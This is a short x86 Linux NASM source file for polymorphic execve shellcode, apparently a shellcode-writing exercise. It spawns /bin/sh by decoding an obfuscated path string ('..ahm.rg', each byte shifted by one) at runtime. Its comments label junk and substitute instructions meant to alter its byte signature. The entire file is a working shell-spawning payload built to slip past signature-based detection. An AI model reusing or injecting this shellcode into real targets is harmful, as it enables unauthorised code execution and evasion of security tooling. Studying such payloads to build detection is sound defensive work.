; Filename: poly-execve.nasm


global _start

section .text

_start:
    jmp short here

me:
    pop esi
    mov edi,esi
    
    xor eax,eax
    push eax
    mov edx,esp
    
    push eax
    add esp, 2                      ;2. add more useless adds
    add esp, 1
    lea esi,[esi +4]
    xor eax,[esi]
    add eax, 0x01010101             ;1b. add back 0x1 to each byte
    push eax
    xor eax,eax
    xor eax,[edi]
    add eax, 0x01010101             ;1c. add back 0x1 to each byte
    push eax
    mov ebx,esp 

    sub ebx, 4                      ;3a. add a sub
    xor eax,eax
    push eax
    lea edi,[ebx +4]                ;3b. adjust for sub
    push edi
    mov ecx,esp

    add ebx, 4                      ;3c. adjust for sub
    mov al, 0xf                     
    and al, 0xb                     ;4. AND to move in 0xb
    int 0x80

here:
    call me
    path db "..ahm.rg"              ;1a. minus each byte by 0x1
